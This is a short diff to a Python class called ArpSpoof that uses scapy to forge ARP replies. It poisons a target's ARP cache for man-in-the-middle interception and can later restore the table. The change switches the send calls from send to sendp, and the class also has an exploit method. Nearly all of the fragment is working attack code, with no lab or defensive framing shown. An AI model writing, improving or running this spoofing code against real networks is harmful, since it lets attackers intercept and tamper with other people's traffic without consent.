@@ -31,7 +31,7 @@ class ArpSpoof:
         if t_mac is None:
             return
         packet = scapy.ARP(op=2, psrc=host_ip, pdst=target, hwdst=t_mac)
-        scapy.send(packet, iface=interface, verbose=False)
+        scapy.sendp(packet, iface=interface, verbose=False)
 
     def restore(self, interface, dest_ip, source_ip):
         """Restores the ARP table of the target to its original state."""
@@ -42,7 +42,7 @@ class ArpSpoof:
             print(f"[!] Could not restore {dest_ip}")
             return
         packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac)
-        scapy.send(packet, iface=interface, verbose=False)
+        scapy.sendp(packet, iface=interface, verbose=False)
         print(f"[+] Restored {dest_ip} to it's original state.")
 
     def exploit(self, interface, target, spoof, interval):
